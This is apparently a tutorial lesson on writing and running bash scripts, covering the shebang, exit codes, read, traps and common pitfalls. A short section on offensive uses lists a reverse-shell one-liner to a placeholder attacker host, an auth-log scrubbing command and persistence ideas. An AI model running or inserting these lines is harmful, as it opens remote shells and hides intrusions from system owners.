# Lesson 10: Writing & Running Scripts

## History & Origins

Shell scripting is as old as Unix itself. Ken Thompson's first shell (1971) was itself a "script" — a thin wrapper around the system's executable binaries. The `/bin/sh` concept appeared with the Bourne shell (1977), named after its creator Stephen Bourne. The shebang `#!` was introduced by Dennis Ritchie at Bell Labs around 1980 — it was added to the kernel's `execve()` system call as a way for the kernel to recognize interpreted scripts. Prior to shebang, scripts used the Bourne shell's `.` command or were run via `sh script.sh` explicitly.

The name "shebang" comes from "SHArp bang" — `#` is "sharp" and `!` is "bang" in typesetter jargon. Before shebang support, the kernel would just fail `execve()` on text files. The system was patched so that if the first two bytes were `#!`, the kernel read the rest of the line as the interpreter path and ran that instead. This is why the shebang MUST be binary-exact — the kernel doesn't care about lines, it reads the first few bytes.

Bash (Brian Fox, 1989) extended the Bourne shell's scripting model with arrays, `[[ ]]`, functions with `local`, and many builtins. Today, bash scripts are the de facto standard for Unix/Linux automation.

## Syntax Reference

### Script structure
```bash
#!/bin/bash                         # Shebang — kernel reads this
# Author: you                       # Comments ignored
set -euo pipefail                   # Safety net (optional but recommended)

# Main script body
echo "Hello, World!"
exit 0                              # Explicit exit code (0 = success)
```

### Shebang variants
```bash
#!/bin/bash               # Absolute path to bash
#!/usr/bin/env bash        # Portable: find bash via PATH
#!/bin/sh                  # POSIX shell (may be dash on Debian)
#!/usr/bin/python3         # Python script
#!/usr/bin/awk -f          # AWK script
#!/bin/sed -f              # Sed script
#!/usr/bin/env node        # Node.js
#!/bin/bash -x             # Bash with debug enabled (note: -x after path)
```

### Output commands
```bash
echo "text"              # Print with newline (unpredictable with -n, -e flags)
echo -n "no newline"     # Suppress newline
echo -e "tab\there"      # Enable escape sequences (inconsistent across shells)
printf "text\n"          # Formatted print (ALWAYS predictable)
printf "%s %d\n" "str" 42  # Format string with arguments
printf -v var "fmt" args   # Store output in variable
```

### Input commands
```bash
read var                 # Read one line into var
read -r var              # Read RAW (no backslash interpretation)
read -p "Prompt: " var   # Prompt inline
read -t 5 var            # Timeout after 5 seconds
read -n 1 var            # Read one character only
read -s var              # Silent (no echo — for passwords)
read -a arr              # Read words into array
read -d ':' var          # Read until delimiter (not newline)
```

### Exit codes
```bash
$?                       # Exit code of last command
exit N                   # Exit script with code N (0-255)
exit                     # Exit with last command's code
trap 'cmd' EXIT          # Run 'cmd' on script exit (even if killed)
trap 'cmd' ERR           # Run 'cmd' on any command failure
trap 'cmd' INT           # Run 'cmd' on Ctrl+C
trap 'cmd' TERM          # Run 'cmd' on SIGTERM
```

### Special variables
```bash
$0, $1, $2, ...    # Script name, argument 1, argument 2...
$#                 # Number of arguments
$@                 # All arguments as separate words (preserves quoting)
$*                 # All arguments as one word
$?                 # Exit code of last command
$$                 # PID of current script
$!                 # PID of last background process
$-                 # Current shell option flags
$_                 # Last argument of last command
$LINENO            # Current line number in script
$FUNCNAME          # Array of function names in call stack
$BASH_SOURCE       # Array of source file paths in call stack
$BASH_VERSION      # Bash version string
$RANDOM            # Random number (0-32767)
$SECONDS           # Seconds since script started
```

### Operators
```bash
;           # Command separator (sequential)
&           # Background execution
&&          # Run next only if previous succeeded (AND)
||          # Run next only if previous failed (OR)
|           # Pipe stdout
|&          # Pipe stdout AND stderr
!           # Negate exit code
```

### Execution
```bash
chmod +x script.sh        # Add execute permission
./script.sh               # Run script (relative path)
bash script.sh            # Run with explicit interpreter
source script.sh          # Run in current shell
. script.sh               # POSIX source
exec script.sh            # Replace current shell with script
```

## Under the Hood

### What Happens When You Run `./script.sh`

1. **Kernel intercept**: Shell calls `fork()` then `execve("./script.sh", argv, envp)`
2. **Kernel reads shebang**: The kernel opens the file, reads the first 2 bytes. If `#!`, it reads the rest of the first line (up to newline). Maximum shebang line length is 127 bytes (varies by system, typically 256 on Linux).
3. **Interpreter resolution**: The kernel parses the shebang. For `#!/bin/bash`, it sets interpreter = `/bin/bash`, and the script path becomes an argument.
4. **Kernel executes**: `execve("/bin/bash", ["/bin/bash", "./script.sh"], envp)`
5. **Bash runs**: Bash receives its own path as argv[0] and the script path as argv[1]. It opens and reads the script line by line.
6. **Execution**: Bash reads each line, performs expansions (variable, glob, brace, etc.), then executes.

### System Call Trace

```bash
$ strace -f -e trace=process ./hello.sh 2>&1
execve("./hello.sh", ["./hello.sh"], 0x7ffc...) = 0
  # This is the FIRST execve — but it fails! (ENOEXEC)
  # Because the kernel sees #!/bin/bash
  # It re-executes:
execve("/bin/bash", ["bash", "./hello.sh"], 0x7ffc...) = 0
arch_prctl(ARCH_SET_FS, ...) = 0
...
read(0, ...)                       # Only if script reads input
write(1, "Hello, World!\n", 14)    # = 14
exit_group(0)                      # = ?
```

Wait — the above is slightly misleading. On modern Linux, the kernel handles `#!` internally. `execve("./hello.sh", ...)` does NOT return with ENOEXEC — the kernel reads the shebang and replaces `./hello.sh` with `/bin/bash` + `./hello.sh` internally. The process image becomes bash.

### Process Model

```
Parent shell (PID 100)
  |-- fork() -> new PID 101
  |   |-- execve() -> load /bin/bash
  |   |   |-- shebang: /bin/bash reads ./hello.sh
  |   |   |-- open(), read() lines
  |   |   |-- echo "Hello" -> write(1, "Hello\n", 6)
  |   |   |-- exit(0)
  |   +-- wait() -> PID 101 done
  +-- continues
```

### Exit Code Propagation

Every command in Unix returns an exit code (0-255). `0` = success, `1-255` = failure (specific meanings vary). The script's own exit code is whatever `exit N` says, or the exit code of the last command executed.

```bash
$ bash -c 'true; echo $?'
0
$ bash -c 'false; echo $?'
1
$ bash -c 'exit 42; echo $?'   # echo never runs
$ echo $?
42
```

### Memory and File Descriptors

Each script gets:
- Its own address space (from fork)
- File descriptors 0 (stdin), 1 (stdout), 2 (stderr) inherited from parent
- 3+ opened files from the script itself
- The environment array copied from parent (unless `env -i`)

When a script opens a file, the file descriptor is attached to the child process. If the script backgrounds a task (`&`), the child can outlive the script.

## Core Examples (12)

### Example 1: Hello World — The Simplest Script
```bash
$ cat > ~/hello.sh << 'EOF'
#!/bin/bash
echo "Hello, world!"
EOF
$ chmod +x ~/hello.sh
$ ./hello.sh
Hello, world!
```
Step by step: We create the file with a shebang and one command. We add execute permission. We run it. The kernel reads `#!/bin/bash`, invokes bash, bash reads `echo "Hello, world!"`, bash calls `write(1, "Hello, world!\n", 14)`.

**What if:** No shebang? Bash runs the script anyway as a bash script. But other shells would fail. Always include the shebang.

### Example 2: Script with User Input
```bash
$ cat > ~/greet.sh << 'EOF'
#!/bin/bash
echo "What is your name?"
read -r name
echo "Hello, $name!"
EOF
$ chmod +x ~/greet.sh
$ ./greet.sh
What is your name?
Alice
Hello, Alice!
```
`read -r name` reads one line from stdin into the variable `name`. The `-r` flag prevents backslash interpretation. The variable is then expanded with `$name`.

**What if:** No `-r`? Entering `hello\world` would interpret `\w` as an escape (in some shells). Always use `read -r` unless you want escape processing.

### Example 3: Exit Codes for Error Handling
```bash
$ cat > ~/checkroot.sh << 'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    echo "You are root"
    exit 0
else
    echo "You are not root"
    exit 1
fi
EOF
$ chmod +x ~/checkroot.sh
$ ./checkroot.sh
You are not root
$ echo $?
1
```
The script checks the user ID. Root has UID 0. Returns 0 if root, 1 otherwise. The caller checks `$?` to see the result.

**What if:** You use `exit -1`? Exit codes are modulo 256. `exit -1` becomes `exit 255`. `exit 256` becomes `exit 0`. Only use 0-255.

### Example 4: printf — The Reliable Alternative to echo
```bash
$ printf "Name: %s\nAge: %d\n" "Alice" 30
Name: Alice
Age: 30
$ printf "%s " a b c; printf "\n"
a b c
$ printf "%%\n"     # literal percent
%
$ printf "%b\n" "hello\nworld"  # %b enables escape sequences
hello
world
```
`printf` uses a format string like C. `%s`=string, `%d`=integer, `%f`=float, `%x`=hex. It NEVER adds a newline automatically.

**What if:** `printf` vs `echo -e`? `echo -e` is not POSIX and behaves differently in bash vs dash vs zsh. `printf` is POSIX and consistent everywhere.

### Example 5: Process Substitution vs Pipe — The Subshell Trap
```bash
$ cat > ~/readtest.sh << 'EOF'
#!/bin/bash
echo "hello world" | read -r first second
echo "Pipe: first=$first second=$second"

read -r first second <<< "hello world"
echo "Here-string: first=$first second=$second"
EOF
$ chmod +x ~/readtest.sh
$ ./readtest.sh
Pipe: first= second=
Here-string: first=hello second=world
```
In a pipeline, each command runs in a subshell. `read` in `echo "..." | read` happens in a subshell and its variables are lost. `<<<` (here-string) runs in the current shell, so variables persist.

**What if:** You need to pipe into a loop? Use process substitution: `while IFS= read -r line; do ... done < <(command)`.

### Example 6: Using `set -euxo pipefail`
```bash
$ cat > ~/safe.sh << 'EOF'
#!/bin/bash
set -euo pipefail
echo "This runs"
false
echo "This NEVER runs — false caused exit"
EOF
$ ./safe.sh
This runs
$ echo $?
1
```
`set -e` = exit on error. `set -u` = error on undefined variables. `set -o pipefail` = pipeline fails if any stage fails. Together, they make bash behave more like a "real" programming language.

**What if:** You don't use `set -e`? The script continues past errors. A `rm /nonexistent` failure won't stop the script. This is often buggy behavior.

### Example 7: Reading Passwords
```bash
$ cat > ~/login.sh << 'EOF'
#!/bin/bash
read -p "Username: " -r user
read -sp "Password: " -r pass
echo
if [ "$user" = "admin" ] && [ "$pass" = "secret" ]; then
    echo "Access granted"
else
    echo "Access denied"
fi
EOF
$ ./login.sh
Username: admin
Password:
Access granted
```
`-s` makes input silent (no echo). We need the `echo` after `-s` because it suppresses the newline too.

### Example 8: Command Line Arguments
```bash
$ cat > ~/args.sh << 'EOF'
#!/bin/bash
echo "Script: $0"
echo "Args: $#"
echo "First: $1"
echo "Second: $2"
echo "All: $@"
echo "All as one: $*"
EOF
$ ./args.sh foo bar baz
Script: ./args.sh
Args: 3
First: foo
Second: bar
All: foo bar baz
All as one: foo bar baz
```
`$@` preserves argument quoting. `$*` concatenates arguments with space. For `"$@"` vs `"$*"`, the difference is crucial: `"$@"` becomes `"foo" "bar" "baz"` (3 words), `"$*"` becomes `"foo bar baz"` (1 word).

### Example 9: shift Through Arguments
```bash
$ cat > ~/shift.sh << 'EOF'
#!/bin/bash
while [ $# -gt 0 ]; do
    echo "Processing: $1"
    shift
done
EOF
$ ./shift.sh a b c d
Processing: a
Processing: b
Processing: c
Processing: d
```
`shift` removes `$1`, shifting all other arguments down. `$2` becomes `$1`, etc. Great for parsing options.

### Example 10: here-documents
```bash
$ cat > ~/heredoc.sh << 'EOF'
#!/bin/bash
cat << EOF
This is a multi-line
message delivered via
here-document.
EOF

# With variable expansion:
name="world"
cat << EOF
Hello, $name!
EOF

# No expansion (quoted delimiter):
cat << 'EOF'
$HOME is not expanded
EOF
EOF
$ ./heredoc.sh
This is a multi-line
message delivered via
here-document.
Hello, world!
$HOME is not expanded
```

### Example 11: Trap for Cleanup
```bash
$ cat > ~/cleanup.sh << 'EOF'
#!/bin/bash
TMPFILE=$(mktemp)
trap 'rm -f "$TMPFILE"; echo "Cleaned up"; exit' EXIT INT TERM
echo "Temp file: $TMPFILE"
echo "Working..." > "$TMPFILE"
sleep 5
echo "Done"
EOF
$ ./cleanup.sh
Temp file: /tmp/tmp.abc123
^C  # Ctrl+C
Cleaned up
```
`trap` ensures `rm` runs even if the script is interrupted. The temp file gets cleaned up.

### Example 12: Exec to Replace Shell
```bash
$ cat > ~/exec-test.sh << 'EOF'
#!/bin/bash
echo "I am PID $$"
exec sleep 5
echo "This never prints"
EOF
$ ./exec-test.sh
I am PID 12345
```
`exec sleep 5` replaces the shell process with `sleep`. The "This never prints" line never executes because the original shell process no longer exists.

## Real-World Use Cases

### 1. FOR the OS — Administration, Automation, System Maintenance
- **Backup scripts**: Automated tar + gzip + remote copy
- **Log rotation**: Find old logs, compress, delete
- **System health checks**: Disk space, memory, process monitoring
- **User management**: Create/delete users in batch
- **Package updates**: `apt update && apt upgrade -y` in a cron script
- **Firewall management**: Scripted iptables/nftables rule deployment

### 2. WITH the OS — Development, Data Processing, Daily Workflow
- **Build scripts**: Compile, test, deploy pipeline
- **Data processing**: Extract-transform-load patterns with CSV files
- **Git hooks**: Pre-commit checks, post-merge automation
- **Rename batches**: `${f%.txt}.md` parameter expansion in a loop
- **Scaffolding**: Generate project directories and boilerplate files

### 3. AGAINST the OS — Exploitation, Bypasses, Attacks
- **Reverse shell scripts**: `bash -i >& /dev/tcp/attacker/443 0>&1`
- **Privilege escalation checks**: Scripts that scan for SUID binaries, writable scripts, cron jobs
- **Log cleaner**: `grep -v malicious /var/log/auth.log > /tmp/auth.log; cp /tmp/auth.log /var/log/auth.log`
- **Persistence scripts**: Adding reverse shell calls to `.bashrc` or cron
- **Race conditions**: TOCTOU exploits via temp file creation in scripts

### 4. FOR DEFENSE — Detection, Prevention, Auditing
- **Honeypot scripts**: Decoy files that alert when accessed
- **Integrity checks**: `sha256sum` all scripts, compare to baseline
- **Audit scripts**: Scan for world-writable scripts, check for malicious patterns
- **Restricted shell**: Scripts that limit what commands a user can run
- **Log aggregation**: Centralize syslog entries with scripted forwarding

## Memory Aids

- **`$@` vs `$*`**: Think "At" = "each AT its own spot" vs "Star" = "all STARRED together in one blob".
- **`$?`**: The "question" mark asks "what was the last command's answer?"
- **`$$`**: The "self" — your own PID.
- **`$!`**: The "last background" — think "(!) important, it's in the background!"
- **`shift`**: Picture a bus. The front passenger (`$1`) gets off, everyone else moves forward one seat.
- **`read -r`**: The `-r` is "RAW mode" — no backslash interpretation.
- **`set -euo pipefail`**: Remember "EUO" as "Errors Undo Operations" — or just memorize it as the "hard hat" for bash.
- **Shebang**: It's "SHArp bang" because `#` is sharp in music and `!` is bang in comics.
- **`exit 0` vs `exit 1`**: "Zero = zero errors = success. One = one problem = failure."

## Trap Vault (12 traps)

### Trap 1: Windows Line Endings in Scripts
**Problem:** Your script works locally but fails when uploaded.
**Example:**
```bash
$ ./deploy.sh
-bash: ./deploy.sh: /bin/bash^M: bad interpreter: No such file or directory
```
**Why:** Windows uses `\r\n` (CRLF) line endings. The kernel reads `#!/bin/bash\r` and looks for an interpreter literally named `/bin/bash\r`. Which doesn't exist.
**Fix:**
```bash
$ sed -i 's/\r$//' deploy.sh
$ dos2unix deploy.sh
```

### Trap 2: chmod Forgot +x
**Problem:** Script fails to run with `./` but works with `bash`.
**Example:**
```bash
$ ./script.sh
-bash: ./script.sh: Permission denied
$ bash script.sh
Hello, World!
```
**Fix:** `chmod +x script.sh`

### Trap 3: exit in Sourced Script
**Problem:** You source a script and your terminal closes.
**Example:**
```bash
$ source ~/myscript.sh
# terminal closes
```
**Why:** `exit` in a script that's sourced exits the current shell.
**Fix:** Use `return` in scripts designed to be sourced.

### Trap 4: read Without -r
**Problem:** Backslashes in input are interpreted.
**Example:**
```bash
$ read line
hello\tworld
$ echo "$line"
hello    world  # \t became a tab!
```
**Fix:** Always use `read -r` unless you want escape processing.

### Trap 5: Pipe Loses Variables
**Problem:** Variables set in a pipe are empty after the pipe.
**Example:**
```bash
$ echo "hello" | read -r var
$ echo "$var"
# empty!
```
**Why:** Each pipe segment runs in a subshell.
**Fix:** Use `read -r var <<< "hello"` or `while read -r var; do ... done < <(echo "hello")`.

### Trap 6: set -e Surprises
**Problem:** `set -e` exits on unexpected things.
**Example:**
```bash
$ cat > trap.sh << 'EOF'
#!/bin/bash
set -e
grep "root" /etc/passwd > /dev/null  # succeeds
grep "nonexistent" /etc/passwd > /dev/null  # fails -> EXIT!
echo "This never runs"
EOF
$ ./trap.sh
$ echo $?
1
```
**Why:** `set -e` causes exit on any unchecked failure.
**Fix:** Use `grep "pattern" || true` for commands that might fail, or don't use `set -e` for commands where failure is expected.

### Trap 7: Unquoted Variable in echo
**Problem:** Variable with spaces or globs causes unexpected behavior.
**Example:**
```bash
$ files="*.txt README.md"
$ echo $files
file1.txt file2.txt README.md  # glob expanded!
$ echo "$files"
*.txt README.md
```
**Fix:** Always quote `"$variable"` unless you specifically want word splitting and glob expansion.

### Trap 8: Using ls in for Loop
**Problem:** `for f in $(ls *.txt)` breaks on special characters.
**Example:**
```bash
$ touch "file with spaces.txt"
$ for f in $(ls *.txt); do echo "File: $f"; done
File: file
File: with
File: spaces.txt
```
**Fix:** `for f in *.txt; do echo "File: $f"; done` — let the shell glob.

### Trap 9: Missing Error Checking
**Problem:** Command fails but script continues as if nothing happened.
**Example:**
```bash
$ cat > bad.sh << 'EOF'
#!/bin/bash
rm /important/file
echo "Done!"  # Runs even if rm failed!
EOF
```
**Fix:** Add `set -e`, or check `$?`, or use `&&`: `rm /important/file && echo "Done"`.

### Trap 10: echo -n and -e Are Not Portable
**Problem:** Script works in bash but fails in sh or dash.
**Example:**
```bash
$ dash -c 'echo -n "no newline"'
-n no newline   # dash doesn't support -n!
```
**Fix:** Use `printf` instead: `printf "%s" "no newline"`.

### Trap 11: Variable in Double Quotes With Commas
**Problem:** `printf` format string containing user data is dangerous.
**Example:**
```bash
$ var="%s%s%s%s%s%s%s%s%s%s%s%s"
$ printf "$var"  # prints garbage!
```
**Fix:** Use `printf "%s" "$var"` — put the format string as a literal, not a variable.

### Trap 12: shebang With Spaces
**Problem:** Shebang with interpreter path containing space.
**Example:**
```bash
#!/usr/bin/env bash -x   # WRONG — most systems reject this
```
**Why:** Most Unix kernels only allow ONE argument after the interpreter path in the shebang. `#!/usr/bin/env bash -x` sends `bash -x` as a single argument to `env`, which fails.
**Fix:** `#!/bin/bash -x` or use `set -x` in the script.

## See It In The Wild

### Common system scripts
Look around your system for real scripts:
```bash
$ head -3 /usr/bin/clear
$ head -3 /usr/bin/which
$ head -5 /etc/cron.daily/*
```

### Try this now:
```bash
# 1. Create and test the classic "backup" in one line
$ tar czf /tmp/backup-$(date +%F).tar.gz ~/scripts 2>/dev/null && echo "Backup created"

# 2. Find all scripts in /usr/bin and count their lines
$ for f in /usr/bin/*; do file "$f" | grep -q "shell script" && wc -l < "$f"; done | sort -rn | head -5

# 3. Trace script execution
$ bash -x ~/hello.sh

# 4. Check your own PATH for scripts
$ for dir in ${PATH//:/ }; do [ -d "$dir" ] && echo "$dir: $(ls "$dir" 2>/dev/null | wc -l) files"; done
```

## Check Your Understanding (7 questions)

1. What does `#!/bin/bash` actually do at the kernel level?

2. Why is `printf` preferred over `echo` for portable scripts?

3. What happens to `$var` if you assign it inside a pipeline? Why?

4. What is the difference between `"$@"` and `"$*"`? Give an example where they differ.

5. What does `exec` do differently from just running a command?

6. If a script has `exit 1`, what value ends up in `$?` of the calling shell? What about `exit 255`? `exit 256`?

7. Why does `read -r` matter? What problem does `-r` solve?
